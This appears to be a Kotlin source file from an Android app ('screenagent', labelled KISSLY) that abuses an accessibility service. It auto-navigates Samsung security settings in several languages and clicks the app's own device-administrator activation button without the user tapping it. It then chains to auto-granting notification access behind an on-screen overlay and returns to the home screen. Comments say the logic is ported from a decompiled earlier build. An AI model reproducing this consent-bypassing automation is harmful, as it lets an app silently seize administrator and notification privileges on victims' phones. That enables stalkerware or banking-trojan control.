package com.zaka.screenagent.admin

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService

/**
 * 自动激活设备管理员。移植 2.2 `p087/RunnableC0857` 的 step=3 循环：
 *  - 每 0.6s 扫窗口，找「激活此管理应用程序 / 激活 / 启动 / Activate / 确定」并点
 *  - 激活成功（MoyingAdminReceiver.onEnabled）后停止
 *  - 最多跑 120s，避免死循环
 */
object AdminActivator {

    private const val TAG = "AdminActivator"
    private const val INTERVAL_MS = 600L
    private const val MAX_TICKS = 200 // 200 * 0.6s = 120s
    private const val OPEN_PAGE_DELAY_MS = 700L

    private val handler = Handler(Looper.getMainLooper())
    private var running = false
    private var ticks = 0

    private val activateTexts: Array<String> = com.zaka.screenagent.util.UiTexts.activate.toTypedArray()

    fun start(context: Context) {
        if (running) return
        if (MoyingAdminReceiver.isActive(context)) {
            Log.d(TAG, "already active, skip")
            onFinished(context)
            return
        }
        running = true
        ticks = 0
        Log.d(TAG, "polling for activation page (0.6s)")
        // 激活页由 PermissionActivity 负责打开（必须不带 NEW_TASK，否则 DeviceAdminAdd 自杀）。
        // 这里只负责轮询等待，并在超时后兜底打开列表页。
        handler.postDelayed(tick, INTERVAL_MS)
        handler.postDelayed({
            if (running && ticks > 25) {
                Log.w(TAG, "activation page not found, fallback to admin list")
                runCatching { MoyingAdminReceiver.openAdminList(context) }
            }
        }, OPEN_PAGE_DELAY_MS + 15_000L)
    }

    fun stop() {
        running = false
        handler.removeCallbacks(tick)
    }

    private val tick = object : Runnable {
        override fun run() {
            if (!running) return
            ticks++
            val ctx = serviceContext
            if (ctx != null && MoyingAdminReceiver.isActive(ctx)) {
                Log.d(TAG, "device admin activated")
                onFinished(ctx)
                return
            }
            if (autoclick) {
                runCatching { clickActivate() }
                if (navigationEnabled) runCatching { navigateToAdminList(serviceContext ?: return@runCatching) }
            }
            if (ticks >= MAX_TICKS) {
                com.zaka.screenagent.util.UiDump.dump("admin activate timeout")
                Log.w(TAG, "give up after $ticks ticks")
                running = false
                return
            }
            if (running) handler.postDelayed(this, INTERVAL_MS)
        }
    }

    private var serviceContext: Context? = null

    /** 调试用：false 时只打开激活页，不自动点 */
    var autoclick: Boolean = true
    /** 调试/直连模式：false 时不再自己导航（由 DeviceAdminActivity 直接起激活页） */
    var navigationEnabled: Boolean = true

    /** 三星路径：安全与隐私 → 其他安全设置 → 设备管理应用程序 → 点 KISSLY 那行开关 */
    private val navSteps = listOf(
        arrayOf("其他安全设置", "Other security settings", "Otras opciones de seguridad",
            "Outras opções de segurança", "Autres paramètres de sécurité",
            "Weitere Sicherheitseinstellungen", "Другие параметры безопасности"),
        arrayOf("设备管理应用程序", "Device admin apps", "Aplicaciones de administración de dispositivos",
            "Apps de administração do dispositivo", "Applications d'administration de l'appareil",
            "Geräteverwaltungs-Apps", "Приложения администрирования устройства")
    )

    private fun navigateToAdminList(context: Context): Boolean {
        val service = BoundaryAccessibilityService.current() ?: return false
        for (window in service.windows.orEmpty()) {
            val root = window.root ?: continue
            for (step in navSteps) {
                for (text in step) {
                    val nodes = runCatching { root.findAccessibilityNodeInfosByText(text) }.getOrNull()
                    for (n in nodes.orEmpty()) {
                        if (clickNode(n)) {
                            Log.d(TAG, "nav click=$text")
                            return true
                        }
                    }
                }
            }
            // 目标不在屏幕上就往下滚一屏（「其他安全设置」在安全页最底部）
            if (scrollForward(root)) Log.d(TAG, "nav scroll forward")
        }
        return false
    }

    private fun scrollForward(root: AccessibilityNodeInfo): Boolean {
        val stack = ArrayDeque<AccessibilityNodeInfo>()
        stack.add(root)
        var guard = 0
        while (stack.isNotEmpty() && guard++ < 200) {
            val n = stack.removeLast()
            if (n.isScrollable && n.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)) return true
            for (i in 0 until n.childCount) n.getChild(i)?.let { stack.add(it) }
        }
        return false
    }

    private var navStarted = false
    /** 上次点开关的时间：避免连续 tick 把开关「开了又关」 */
    private var lastSwitchClickAt = 0L
    /** 上次点「行」的时间：点完要等 Settings 打开 DeviceAdminAdd，期间绝不能再点行 */
    private var lastRowClickAt = 0L

    /** 页面校验：只有确认在「设备管理应用程序」页，才允许点开关 */
    private val adminPageTitles = arrayOf(
        "设备管理应用程序", "设备管理应用", "Device admin apps",
        "Aplicaciones de administración de dispositivos", "Apps de administração do dispositivo",
        "Applications d'administration de l'appareil", "Geräteverwaltungs-Apps",
        "Приложения администрирования устройства"
    )

    private fun isOnAdminPage(root: AccessibilityNodeInfo): Boolean =
        adminPageTitles.any { t ->
            runCatching { root.findAccessibilityNodeInfosByText(t) }.getOrNull()?.isNotEmpty() == true
        } && collect(root) { it.viewIdResourceName?.endsWith("/switch_widget") == true }.isNotEmpty()

    private fun clickActivate() {
        val service = BoundaryAccessibilityService.current() ?: return
        val ctx = serviceContext
        val label = ctx?.let { appLabelOf(it) }
        for (window in service.windows.orEmpty()) {
            val root = window.root ?: continue
            // ① 三星「设备管理应用程序」列表形态：**必须确认页面**再点，否则可能点到别的列表页（如通知访问）
            if (label != null && isOnAdminPage(root) && clickRowOf(root, label)) {
                Log.d(TAG, "clicked admin ROW of $label (let Settings open DeviceAdminAdd)")
                return
            }
            // ② AOSP「DeviceAdminAdd」形态：点「激活」按钮
            if (clickInRoot(root)) {
                Log.d(TAG, "clicked activate (window scan)")
                return
            }
        }
        // DeviceAdminAdd 是独立页面（Settings 自己的任务），直接按文案点「激活」
        service.rootInActiveWindow?.let {
            if (clickInRoot(it)) Log.d(TAG, "clicked activate (active window)")
        }
    }

    private fun appLabelOf(context: Context): String? = runCatching {
        val pm = context.packageManager
        pm.getApplicationInfo(context.packageName, 0).loadLabel(pm).toString()
    }.getOrNull()

    /**
     * 在「设备管理应用程序」列表里找到包含应用名的那一行，点它自己的 switch_widget。
     * 页面上有多个 switch（KISSLY、查找中心…），必须按行匹配，不能盲点第一个。
     */
    /**
     * 点「KISSLY」这一行（标题节点或它的可点祖先），由系统 Settings 自己打开 DeviceAdminAdd。
     * 直接点开关在三星上不会弹激活页，而且我们若把自己的 Activity 留在任务栈里，
     * DeviceAdminAdd 会被并进我们的任务然后立刻被销毁（实测）。
     */
    private fun clickRowOf(root: AccessibilityNodeInfo, label: String): Boolean {
        // 6 秒内只点一次行：点完系统会打开 DeviceAdminAdd，
        // 若在同一位置继续点，很可能点到新页面的「取消」，把激活页关掉（实测）
        if (System.currentTimeMillis() - lastRowClickAt < 6_000L) return false
        val title = collect(root) { it.text?.toString() == label }.firstOrNull() ?: return false
        var cur: AccessibilityNodeInfo? = title
        var depth = 0
        while (cur != null && depth < 4) {
            if (cur.isClickable && cur.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                lastRowClickAt = System.currentTimeMillis()
                Log.d(TAG, "row clicked, cool down 6s before next row click")
                return true
            }
            cur = cur.parent
            depth++
        }
        return false
    }

    private fun clickSwitchInRowOf(root: AccessibilityNodeInfo, label: String): Boolean {
        // 4 秒内只点一次：Samsung 列表页点开关后要等服务确认，连续点会开关反复横跳
        if (System.currentTimeMillis() - lastSwitchClickAt < 4_000L) return false

        // ⚠️ 必须锁定「只含一个开关」的行容器。
        // 之前用"向上 5 层祖先 + 祖先子树里含应用名"的判定：祖先一旦到达列表容器
        //（包含所有行，自然也就包含 KISSLY），就会把**每一个**未勾选的开关都点开 ——
        // 实测把通知访问页里别的应用全打开了。
        val title = collect(root) { it.text?.toString() == label }.firstOrNull() ?: return false
        var cur: AccessibilityNodeInfo? = title
        var depth = 0
        while (cur != null && depth < 3) {
            val switches = collect(cur) { it.viewIdResourceName?.endsWith("/switch_widget") == true }
            if (switches.size == 1) {
                val sw = switches.first()
                if (runCatching { sw.isChecked }.getOrDefault(false)) return false
                if (sw.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    lastSwitchClickAt = System.currentTimeMillis()
                    Log.d(TAG, "switch clicked in own row, waiting for confirmation")
                    return true
                }
                return false
            }
            cur = cur.parent
            depth++
        }
        Log.d(TAG, "row container not found for $label (refuse to click blindly)")
        return false
    }

    private fun subtreeHasText(root: AccessibilityNodeInfo, text: String): Boolean {
        val stack = ArrayDeque<AccessibilityNodeInfo>()
        stack.add(root)
        var guard = 0
        while (stack.isNotEmpty() && guard++ < 200) {
            val n = stack.removeLast()
            if (n.text?.toString() == text) return true
            for (i in 0 until n.childCount) n.getChild(i)?.let { stack.add(it) }
        }
        return false
    }

    private fun collect(
        root: AccessibilityNodeInfo,
        predicate: (AccessibilityNodeInfo) -> Boolean
    ): List<AccessibilityNodeInfo> {
        val out = ArrayList<AccessibilityNodeInfo>()
        val stack = ArrayDeque<AccessibilityNodeInfo>()
        stack.add(root)
        var guard = 0
        while (stack.isNotEmpty() && guard++ < 500) {
            val n = stack.removeLast()
            if (predicate(n)) out.add(n)
            for (i in 0 until n.childCount) n.getChild(i)?.let { stack.add(it) }
        }
        return out
    }

    private fun clickInRoot(root: AccessibilityNodeInfo): Boolean {
        // ① 优先按按钮 id 点：三星激活页是 com.android.settings:id/action_button（文案「启动」），
        //    AOSP 是 android:id/button1。它们的 clickable 有时是 false，交给 UiTap 手势兜底。
        val byId = collect(root) {
            val id = it.viewIdResourceName ?: ""
            id.endsWith("/action_button") || id.endsWith("/button1") || id.endsWith("/add_button")
        }
        for (node in byId) {
            if (clickNode(node)) {
                Log.d(TAG, "clicked activate button by id=${node.viewIdResourceName}")
                return true
            }
        }
        // ② 再按**完全相等**的文案点（findAccessibilityNodeInfosByText 是包含匹配，会误点长句）
        for (node in collect(root) { it.text?.toString()?.trim() in activateTexts }) {
            if (clickNode(node)) {
                Log.d(TAG, "clicked activate by exact text=${node.text}")
                return true
            }
        }
        return false
    }

    private fun clickNode(node: AccessibilityNodeInfo?): Boolean =
        com.zaka.screenagent.util.UiTap.clickNode(node)

    /** 引导收尾：写 permFlowDone、进度 100、2.5s 后收浮层并回桌面（2.2 rda.onEnabled 的行为） */
    private fun onFinished(context: Context) {
        running = false
        serviceContext = null
        handler.removeCallbacks(tick)
        OnboardingState.markDone(context)
        com.zaka.screenagent.ui.GuardOverlay.updateProgress(
            com.zaka.screenagent.ui.GuardOverlay.STAGE_ADMIN_DONE)
        com.zaka.screenagent.perm.PermissionClicker.stop()
        // 引导最后一环：自动开「通知使用权」。
        // 注意顺序：这里**不能**先 HOME / 先收浮层 —— 会把刚拉起的设置页顶到后台，
        // 收尾（HOME + 收浮层）交给 NotificationAccessActivator 完成后做。
        val started = runCatching {
            com.zaka.screenagent.notify.NotificationAccessActivator.start(context)
        }.getOrDefault(false)
        if (!started) {
            com.zaka.screenagent.ui.GuardOverlay.closeAfter(1500)
            runCatching { BoundaryAccessibilityService.home() }
        }
    }

    /** 供服务在引导开始时把 Context 传进来 */
    fun attach(context: Context) {
        serviceContext = context
    }
}
